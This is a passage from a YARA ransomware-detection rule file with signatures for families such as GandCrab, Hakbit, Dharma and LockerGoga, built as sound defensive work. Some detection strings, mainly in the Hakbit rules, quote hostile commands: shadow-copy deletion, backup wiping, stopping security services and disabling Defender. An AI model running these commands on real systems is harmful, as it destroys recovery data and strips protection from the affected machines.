\"RNDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n        $string2 = \"keme132.DLL\"\n        $string3 = \"klospad.pdb\"\n\n    condition:\n        3 of them\n}\n\nrule ransomware_windows_cryptolocker\n{\n    meta:\n        description = \"CryptoLocker ransomware\"\n        ref = \"https://www.secureworks.com/research/cryptolocker-ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryptoLocker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_cryptolocker\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $u0 = \"Paysafecard is an electronic payment method for predominantly online shopping\" fullword ascii wide\n        $u1 = \"bb to select the method of payment and the currency.\" fullword ascii wide\n        $u2 = \"Where can I purchase a MoneyPak?\" fullword ascii wide\n        $u3 = \"Ukash is electronic cash and e-commerce brand.\" fullword ascii wide\n        $u4 = \"You have to send below specified amount to Bitcoin address\" fullword ascii wide\n        $u5 = \"cashU is a prepaid online\" fullword ascii wide\n        $u6 = \"Your important files \\\\b encryption\" fullword ascii wide\n        $u7 = \"Encryption was produced using a \\\\b unique\\\\b0  public key\" fullword ascii wide\n        $u8 = \"then be used to pay online, or loaded on to a prepaid card or eWallet.\" fullword ascii wide\n        $u9 = \"Arabic online gamers and e-commerce buyers.\" fullword ascii wide\n\n    condition:\n        2 of them\n}\n\nrule Ransom_CryptXXX_Dropper\n{\n    meta:\n        description = \"CryptXXX ransomware\"\n        ref = \"https://www.ccn-cert.cni.es/seguridad-al-dia/comunicados-ccn-cert/4002-publicado-el-informe-del-codigo-danino-ransom-cryptxxx.html\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryptXXX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_CryptXXX_Dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 50 65 31 57 58 43 46 76 59 62 48 6F 35 }\n        $b = { 43 00 3A 00 5C 00 42 00 49 00 45 00 52 00 5C 00 51 00 6D 00 6B 00 4E 00 52 00 4C 00 46 00 00 }\n\n    condition:\n        all of them\n}\n\nrule Ransom_CryptXXX_Real\n{\n    meta:\n        description = \"CryptXXX ransomware\"\n        ref = \"https://www.ccn-cert.cni.es/seguridad-al-dia/comunicados-ccn-cert/4002-publicado-el-informe-del-codigo-danino-ransom-cryptxxx.html\"\n        classifications = \"Ransomware\"\n        threat_names = \"CryptXXX\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_CryptXXX_Real\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 52 59 47 40 4A 41 59 5D 52 00 00 00 FF FF FF FF }\n        $b = { 06 00 00 00 52 59 47 40 40 5A 00 00 FF FF FF FF }\n        $c = { 0A 00 00 00 52 5C 4B 4D 57 4D 42 4B 5C 52 00 00 }\n        $d = { FF FF FF FF 0A 00 00 00 52 5D 57 5D 5A 4B 43 70 }\n        $e = { 3F 52 00 00 FF FF FF FF 06 00 00 00 52 4C 41 41 }\n        $f = { 5A 52 00 00 FF FF FF FF 0A 00 00 00 52 5C 4B 4D }\n        $g = { 41 58 4B 5C 57 52 00 00 FF FF FF FF 0E 00 00 00 }\n        $h = { 52 2A 5C 4B 4D 57 4D 42 4B 20 4C 47 40 52 00 00 }\n        $i = { FF FF FF FF 0A 00 00 00 52 5E 4B 5C 48 42 41 49 }\n        $j = { 5D 52 00 00 FF FF FF FF 05 00 00 00 52 4B 48 47 }\n        $k = { 52 00 00 00 FF FF FF FF 0C 00 00 00 52 4D 41 40 }\n        $l = { 48 47 49 20 43 5D 47 52 00 00 00 00 FF FF FF FF }\n        $m = { 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 3F 52 00 00 }\n        $n = { FF FF FF FF 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 }\n        $o = { 3C 52 00 00 FF FF FF FF 08 00 00 00 52 49 41 41 }\n        $p = { 49 42 4B 52 00 00 00 00 FF FF FF FF 06 00 00 00 }\n        $q = { 52 5A 4B 43 5E 52 00 00 FF FF FF FF 08 00 00 00 }\n        $v = { 52 48 3A 4C 4D 70 3F 52 00 00 00 00 FF FF FF FF }\n        $w = { 0A 00 00 00 52 4F 42 42 5B 5D 4B 70 3F 52 00 00 }\n        $x = { FF FF FF FF 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 }\n        $y = { 3F 52 00 00 FF FF FF FF 0A 00 00 00 52 5E 5C 41 }\n        $z = { 49 5C 4F 70 3C 52 00 00 FF FF FF FF 09 00 00 00 }\n        $aa = { 52 4F 5E 5E 4A 4F 5A 4F 52 00 00 00 FF FF FF FF }\n        $ab = { 0A 00 00 00 52 5E 5C 41 49 5C 4F 70 3D 52 00 00 }\n        $ac = { FF FF FF FF 08 00 00 00 52 5E 5B 4C 42 47 4D 52 }\n\n    condition:\n        all of them\n}\n\nrule DharmaEncryptedFile {\n    meta:\n        description = \"File encrypted by Dharma Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Dharma\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $marker = { 00 00 00 00 02 00 00 00 0C FE 7A 41 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 00 00 00 00 00 }\n\n    condition:\n    // Contains marker near the end of the file\n        $marker in (filesize-0xff..filesize-0x10)\n    // Is encrypted\n        and math.entropy(0, 200) > 6.5\n}\n\nrule Dharma_Based\n{   \n    meta:\n        description = \"Dharma-based Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Dharma\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"Global\\\\<<BID>>\"\n\t\t$s2 = \"Global\\\\syncronize_\"\n\t\t$s3 = /\\.id(\\[\\w{8}-\\w{4}\\]|-\\w{8}).\\[\\w*\\@\\w*\\.\\w*\\]\\./\n\n    condition:\n\t\t// function string file or file with PE header\n\t\t(\n\t\t\tmime_type == \"text/plain\"\n\t\t\tor mime_type == \"application/octet-stream\"\n\t\t\tor (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n\t\t)\n        and \n\t\t(\n\t\t\t($s1 or $s2)\n\t\t\tand $s3\n\t\t)\n}\n\nrule DjvuEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Djvu Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Djvu,STOP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $sig = \"{36A698B9-D67C-4E07-BE82-0EC5B14B4DF5}\"\n\n    condition:\n        // Contains marker at the end {36A698B9-D67C-4E07-BE82-0EC5B14B4DF5}\n        $sig in (filesize-38..filesize)\n        // Is encrypted\n        and math.entropy(0, 200) > 6.5\n}\n\nrule Djvu\n{\n    meta:\n        description = \"Djvu Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Djvu,STOP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $sig = \"{36A698B9-D67C-4E07-BE82-0EC5B14B4DF5}\"\n        $mut1 = \"{1D6FC66E-D1F3-422C-8A53-C0BBCF3D900D}\"\n        $mut2 = \"{FBB4BCC6-05C7-4ADD-B67B-A98A697323C1}\"\n        $task1 = \"--Admin\" wide ascii\n        $task2 = \"IsNotAutoStart\" wide ascii\n        $task3 = \"IsNotTask\" wide ascii\n        $task4 = \"--Task\" wide ascii\n        $task5 = \"--AutoStart\" wide ascii\n        $task6 = \"--Service\" wide ascii\n        $task7 = \"--ForNetRes\" wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and $sig\n        and 1 of ($mut*)\n        and 3 of ($task*)\n}\n\nrule DMALocker : ransom\n{\n    meta:\n        description = \"DMA Locker ransomware\"\n        ref = \"https://blog.malwarebytes.org/threat-analysis/2016/02/dma-locker-a-new-ransomware-but-no-reason-to-panic/\"\n        classifications = \"Ransomware\"\n        threat_names = \"DMA Locker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"SadFud\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DMALocker\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $uno = { 41 42 43 58 59 5a 31 31 }\n        $dos = { 21 44 4d 41 4c 4f 43 4b }\n        $tres = { 21 44 4d 41 4c 4f 43 4b 33 2e 30 }\n        $cuatro = { 21 44 4d 41 4c 4f 43 4b 34 2e 30 }\n\n    condition:\n        any of them\n}\n\nrule DMALocker4 : ransom\n{\n    meta:\n        description = \"DMA Locker ransomware\"\n        ref = \"https://blog.malwarebytes.org/threat-analysis/2016/02/dma-locker-a-new-ransomware-but-no-reason-to-panic/\"\n        classifications = \"Ransomware\"\n        threat_names = \"DMA Locker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"SadFud\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DMALocker4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $clave = { 21 44 4d 41 4c 4f 43 4b 34 2e 30 }\n\n    condition:\n        $clave\n}\n\nrule Erebus : ransom\n{\n    meta:\n        description = \"Erebus ransomware\"\n        ref = \"http://blog.trendmicro.com/trendlabs-security-intelligence/erebus-resurfaces-as-linux-ransomware/\"\n        classifications = \"Ransomware\"\n        threat_names = \"Erebus\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Erebus\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"/{5f58d6f0-bb9c-46e2-a4da-8ebc746f24a5}//log.log\"\n        $b = \"EREBUS IS BEST.\"\n\n    condition:\n        all of them\n}\n\nrule EternalRocks_taskhost\n{\n    meta:\n        description = \"EternalRocks / Doomsday ransomware\"\n        ref = \"https://twitter.com/stamparm/status/864865144748298242\"\n        classifications = \"Ransomware\"\n        threat_names = \"EternalRocks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"EternalRocks_taskhost\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"EternalRocks.exe\" fullword wide\n        $s1 = \"sTargetIP\" fullword ascii\n        $s2 = \"SERVER_2008R2_SP0\" fullword ascii\n        $s3 = \"20D5CCEE9C91A1E61F72F46FA117B93FB006DB51\" fullword ascii\n        $s4 = \"9EBF75119B8FC7733F77B06378F9E735D34664F6\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 15000KB and 1 of ($x*) or 3 of them)\n}\n\nrule EternalRocks_svchost\n{\n    meta:\n        description = \"EternalRocks / Doomsday ransomware\"\n        ref = \"https://twitter.com/stamparm/status/864865144748298242\"\n        classifications = \"Ransomware\"\n        threat_names = \"EternalRocks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"EternalRocks_svchost\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WczTkaJphruMyBOQmGuNRtSNTLEs\" fullword ascii\n        $s2 = \"svchost.taskhost.exe\" fullword ascii\n        $s3 = \"ConfuserEx v\" ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 2 of them)\n}\n\nprivate rule document_analysis\n{\n    meta:\n        description = \"Rule to limit file types\"\n        author = \"VMRay Labs\"\n\n    condition:\n        analysis_id == \"pdf\"\n        or analysis_id == \"office97\"\n        or analysis_id == \"olecf\"\n        or analysis_id == \"ooxml\"\n        or analysis_id == \"rtf\"\n}\n\nrule GandCrab_Apr18_1\n{\n    meta:\n        description = \"GandCrab ransomware\"\n        ref = \"https://twitter.com/MarceloRivero/status/988455516094550017\"\n        classifications = \"Ransomware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_GandCrab_Apr18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and pe.imphash() == \"7936b0e9491fd747bf2675a7ec8af8ba\"\n}\n\nrule GandCrabEncryptedFile {\n    meta:\n        description = \"File encrypted by GandCrab Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"GandCrab\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    condition:\n    // Contains marker at the end\n        uint32be(filesize-8) == 0x18298993 and uint32be(filesize-4) == 0x81820300\n    // Is encrypted\n        and math.entropy(0, 200) > 6.5\n}\n\nrule GandCrab_RansomNote\n{\n    meta:\n        description = \"Ransom Note dropped by GandCrab Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"GandCrab\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $r1 = /[a-zA-Z2-7]{16}\\.onion/ wide ascii\n        $r2 = /[a-zA-Z2-7]{56}\\.onion/ wide ascii\n\n        $name = \"GANDCRAB\" wide ascii nocase\n        $crab1 = \"Attention!\" wide ascii\n        $crab2 = \"encrypted\" wide ascii\n        $crab3 = \"Download Tor browser\" wide ascii\n        $crab4 = \"decrypt 1 file for free\" wide ascii\n\n        $crab5 = \"BEGIN GANDCRAB KEY\" wide ascii\n        $crab6 = \"Open Tor Browser\" wide ascii\n        $crab7 = \"extension\" wide ascii\n\n        $crab8 = \".CRAB\" wide ascii\n        $crab9 = \".KRAB\" wide ascii\n        $crab10 = \".GDCB\" wide ascii\n\n    condition:\n        not document_analysis\n        and not mime_type == \"text/javascript\"\n        and not mime_type == \"text/x-vbscript\"\n        and not mime_type == \"application/x-vba-macros\"\n        and $name\n        and 4 of ($crab*)\n        and 1 of ($r*)\n}\n\nrule GoldenEye_Ransomware_XLS\n{\n    meta:\n        description = \"GoldenEye ransomware\"\n        ref = \"https://goo.gl/jp2SkT\"\n        classifications = \"Ransomware\"\n        threat_names = \"GoldenEye\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoldenEye_Ransomware_XLS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"fso.GetTempName();tmp_path = tmp_path.replace('.tmp', '.exe')\" fullword ascii\n        $x2 = \"var shell = new ActiveXObject('WScript.Shell');shell.run(t'\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xcfd0 and filesize < 4000KB and 1 of them)\n}\n\nrule GPGQwerty\n{\n    meta:\n        description = \"GPGQwerty ransomware\"\n        ref = \"https://securingtomorrow.mcafee.com/mcafee-labs/ransomware-takes-open-source-path-encrypts-gnu-privacy-guard/\"\n        classifications = \"Ransomware\"\n        threat_names = \"GPGQwerty\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"McAfee Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"crime_ransomware_windows_GPGQwerty\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"gpg.exe \u2013recipient qwerty  -o\"\n        $b = \"%s%s.%d.qwerty\"\n        $c = \"del /Q /F /S %s$recycle.bin\"\n        $d = \"cryz1@protonmail.com\"\n\n    condition:\n        all of them\n}\n\nprivate rule Hakbit_FunctionStrings\n{\n    meta:\n        description = \"Hakbit Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"amsi.dll\"\n        // disable defender\n        $s2 = \"DisableAntiSpyware\"\n        $s3 = \"DisableBehaviorMonitoring\"\n        $s4 = \"DisableOnAccessProtection\"\n        $s5 = \"DisableScanOnRealtimeEnable\"\n        $s6 = \"DisableTaskMgr\"\n        $s7 = \"https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe\"\n\n        $a1 = \"\\\"powershell\\\" Get-MpPreference -verbose\"\n        $a2 = \"\\\"net.exe\\\" stop NetBackup BMR MTFTP Service /y\"\n        $a3 = \"\\\"net.exe\\\" stop avpsus /y\"\n        $a4 = \"\\\"net.exe\\\" stop McAfeeDLPAgentService /y\"\n        $a5 = \"\\\"net.exe\\\" stop mfewc /y\"\n        $a6 = \"\\\"net.exe\\\" stop BMR Boot Service /y\"     \n        $a7 = \"\\\"sc.exe\\\" config SQLTELEMETRY$ECWDB2 start= disabled\"\n        $a8 = \"\\\"net.exe\\\" stop NetBackup BMR MTFTP Service /y\"\n        $a9 = \"\\\"sc.exe\\\" config SQLTELEMETRY start= disabled\"\n        $a10 = \"\\\"sc.exe\\\" config SQLTELEMETRY$ECWDB2 start= disabled\"\n        $a11 = \"\\\"sc.exe\\\" config SQLWriter start= disabled\"\n        $a12 = \"\\\"sc.exe\\\" config SstpSvc start= disabled\"\n        $a13 = \"\\\"taskkill.exe\\\" /IM mspub.exe /F\"\n        $a14 = \"\\\"taskkill.exe\\\" /IM mydesktopqos.exe /F\"\n        $a15 = \"\\\"taskkill.exe\\\" /IM mydesktopservice.exe /F\"\n        $a16 = \"\\\"del.exe\\\" /s /f /q d:\\\\*.VHD d:\\\\*.bac d:\\\\*.bak d:\\\\*.wbcat d:\\\\*.bkf d:\\\\Backup*.* d:\\\\backup*.* d:\\\\*.set d:\\\\*.win d:\\\\*.dsk\"\n        $a17 = \"\\\"vssadmin.exe\\\" Delete Shadows /all /quiet\"\n        $a18 = \"/C choice /C Y /N /D Y /T 3 & Del \\\"C:\\\\Users\\\\5p5NrGJn0jS HALPmcxz\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n\n    condition:\n        vmray_target_class == \"function_strings\"\n        and 16 of ($a*)\n        and any of ($s*)\n}\n\nprivate rule Hakbit_Disable\n{\n    meta:\n        description = \"Hakbit Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = \"Set-MpPreference -DisableRealtimeMonitoring $true\" wide ascii\n        $ = \"Set-MpPreference -DisableBehaviorMonitoring $true\" wide ascii\n        $ = \"Set-MpPreference -DisableBlockAtFirstSeen $true\" wide ascii\n        $ = \"Set-MpPreference -DisableIOAVProtection $true\" wide ascii\n        $ = \"Set-MpPreference -DisablePrivacyMode $true\" wide ascii\n        $ = \"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\" wide ascii\n        $ = \"Set-MpPreference -DisableArchiveScanning $true\" wide ascii\n        $ = \"Set-MpPreference -DisableIntrusionPreventionSystem $true\" wide ascii\n        $ = \"Set-MpPreference -DisableScriptScanning $true\" wide ascii\n        $ = \"Set-MpPreference -SubmitSamplesConsent 2\" wide ascii\n        $ = \"Set-MpPreference -MAPSReporting 0\" wide ascii\n        $ = \"Set-MpPreference -HighThreatDefaultAction 6 -Force\" wide ascii\n        $ = \"Set-MpPreference -ModerateThreatDefaultAction 6\" wide ascii\n        $ = \"Set-MpPreference -LowThreatDefaultAction 6\" wide ascii\n        $ = \"Set-MpPreference -SevereThreatDefaultAction 6\" wide ascii\n\n    condition:\n        (\n            vmray_target_class == \"file\"\n            or vmray_target_class == \"memory_dump\"\n        )\n        and all of them\n}\n\nprivate rule Hakbit_Binary\n{\n    meta:\n        description = \"Hakbit Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $a1 = \"VIRTUAL\" wide ascii\n        $a2 = \"vmware\" wide ascii\n        $a3 = \"VirtualBox\" wide ascii\n        $a4 = \"SbieDll.dll\" wide ascii\n\n        $s1 = \"VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ\" wide ascii\n        $s2 = \"QXRlbnRpb24h\" wide ascii\n        $s3 = \"L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA\" wide ascii\n        $s4 = \"3747bdbf-0ef0-42d8-9234-70d68801f407\" wide ascii\n        $s5 = \".builder\" wide ascii\n        $s6 = \"ftp://files.000webhost.com/public_html/\" wide ascii\n        $s7 = \"http://www.my_wallpaper_location.com/wallpaper.bmp\" wide ascii\n        $s8 = \"HELP_ME_RECOVER_MY_FILES\" wide ascii\n        $s9 = \"RansomBuilder_Log\" wide ascii\n        $s10 = \"win32_logicaldisk.deviceid\" wide ascii\n        $s11 = \"-m=psexec -i=\" wide ascii\n    condition:\n        (\n            vmray_target_class == \"file\"\n            or vmray_target_class == \"memory_dump\"\n        )\n        and any of ($a*)\n        and 7 of ($s*)\n}\n\nrule Hakbit\n{\n    meta:\n        description = \"Hakbit Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Hakbit\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            vmray_target_class == \"file\"\n            or vmray_target_class == \"memory_dump\"\n            or vmray_target_class == \"function_strings\"\n        )\n        and (Hakbit_Disable and Hakbit_Binary) or Hakbit_FunctionStrings\n}\n\nrule Hermes2_1\n{\n    meta:\n        description = \"Hermes ransomware\"\n        ref = \"https://baesystemsai.blogspot.de/2017/10/taiwan-heist-lazarus-tools.html\"\n        classifications = \"Ransomware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"BAE\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hermes2_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Nls\\\\Language\\\\\"\n        $s2 = \"0419\"\n        $s3 = \"0422\"\n        $s4 = \"0423\"\n        $S1 = \"HERMES\"\n        $S2 = \"vssadminn\"\n        $S3 = \"finish work\"\n        $S4 = \"testlib.dll\"\n        $S5 = \"shadowstorageiet\"\n        $u1 = \"ALKnvfoi4tbmiom3t40iomfr0i3t4jmvri3tb4mvi3btv3rgt4t777\"\n        $u2 = \"HERMES 2.1 TEST BUILD, press ok\"\n        $u3 = \"hnKwtMcOadHwnXutKHqPvpgfysFXfAFTcaDHNdCnktA\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($s*) and 3 of ($S*) and 1 of ($u*)\n}\n\nrule HermesRyukEncryptedFile {\n    meta:\n        description = \"File encrypted by Hermes or Ryuk Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Ryuk\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $marker = { 48 45 52 4D 45 53 01 02 00 00 10 66 00 00 00 A4 }\n\n    condition:\n    // Contains marker near the end of the file\n        $marker in (filesize-0x200..filesize-0x10)\n    // Is encrypted\n        and math.entropy(0, 200) > 6.5\n}\n\n\nrule HydraCrypt\n{\n    meta:\n        description = \"HydraCrypt ransomware\"\n        ref = \"https://securingtomorrow.mcafee.com/mcafee-labs/hydracrypt-variant-of-ransomware-distributed-by-angler-exploit-kit/\"\n        classifications = \"Ransomware\"\n        threat_names = \"HydraCrypt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_hydracrypt\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $u0 = \"oTraining\" fullword ascii wide\n        $u1 = \"Stop Training\" fullword ascii wide\n        $u2 = \"Play \\\"sound.wav\\\"\" fullword ascii wide\n        $u3 = \"&Start Recording\" fullword ascii wide\n        $u4 = \"7About record\" fullword ascii wide\n\n    condition:\n        all of them\n}\n\nrule LockerGogaEncryptedFile\n{\n    meta:\n        description = \"File encrypted by LockerGoga Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"LockerGoga\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    condition:\n        mime_type == \"application/octet-stream\"\n        // Contains marker at the correct offset\n        and uint32be(filesize-0x90) == 0x474f4741\n        // Is encrypted\n        and math.entropy(0, 500) > 7.5\n}\n\nrule LockerGogaBinary\n{\n    meta:\n        description = \"LockerGoga Ransomware\"\n        author = \"VMRay Labs\"\n        \n    strings:\n        $v1 = \"boost::filesystem::\" wide ascii\n        $v2 = \"std::filesystem\" wide ascii\n        $r1 = \"Crypto++ RNG\" wide ascii\n        $r2 = \".locked\" wide ascii\n\n        $s1 = \"c:/.log\" wide ascii\n        $s2 = \"log,l\" wide ascii\n        $s3 = \"master,m\" wide ascii\n        $s4 = \"slave,s\" wide ascii\n        $s5 = \"ipc,i\" wide ascii\n        $s6 = \"cipher.exe\" wide ascii\n        \n        $s7 = \"LsaGetLogonSessionData\" wide ascii\n        $s8 = \"LsaEnumerateLogonSessions\" wide ascii\n        $s9 = \" MIGdMA0GCSqGSIb3DQEBAQUAA4GLADCBhwKBgQDLscAMf6QMU0OLT967Q0oMVN/9xRbC6Ymz HVVE05zgpDJRQQLmPPYcPnehaeynF8HGFYbRIEaD0pk4WZwGPLtcRaYuQS1M6v+2j4Vp8faA woNdi7+jI2xw0kQao29FJ8WUQDvrPqODALf8bjiOIO7f1Nc5g9vOEbWyCA1w/vbaVwIBEQ==\" wide ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 1 of ($v*)\n        and all of ($r*)\n        and 5 of ($s*)\n}\n\nrule LockerGogaFStrings\n{\n    meta:\n        description = \"LockerGoga Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"C:\\\\Windows\\\\system32\\\\logoff.exe 0\"\n        $s2 = \"C:\\\\Windows\\\\system32\\\\net.exe user Administrator\"\n        $s3 = \"MX-\"\n        $s4 = \"SM-\"\n        $s5 = \"LOCKED\"\n\n        $s6 = \"HuHuHUHoHo283283@dJD\"\n        $s7 = \"-i SM-tgytutrc -s\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n        )\n        and 5 of ($s*)\n}\n\nrule LockerGoga\n{\n    meta:\n        description = \"LockerGoga Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"LockerGoga\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    condition:\n        